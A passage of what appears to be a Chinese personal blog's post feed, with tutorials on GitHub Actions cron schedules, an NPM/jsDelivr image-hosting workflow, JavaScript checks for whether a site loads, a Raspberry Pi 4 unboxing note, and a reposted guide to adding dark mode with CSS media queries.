SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 11:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 04:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span 